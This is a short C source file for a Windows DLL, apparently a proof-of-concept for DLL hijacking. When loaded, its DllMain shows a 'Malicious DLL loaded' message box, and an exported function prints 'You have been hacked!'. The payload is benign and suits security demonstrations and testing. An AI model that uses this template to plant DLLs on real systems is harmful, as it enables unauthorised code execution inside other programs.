#include<stdio.h>
#include<windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            MessageBox(NULL, "Malicious DLL loaded", "DLL hijacking", MB_OK);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
__declspec(dllexport) void dummy() {
    printf("You have been hacked!\n");
}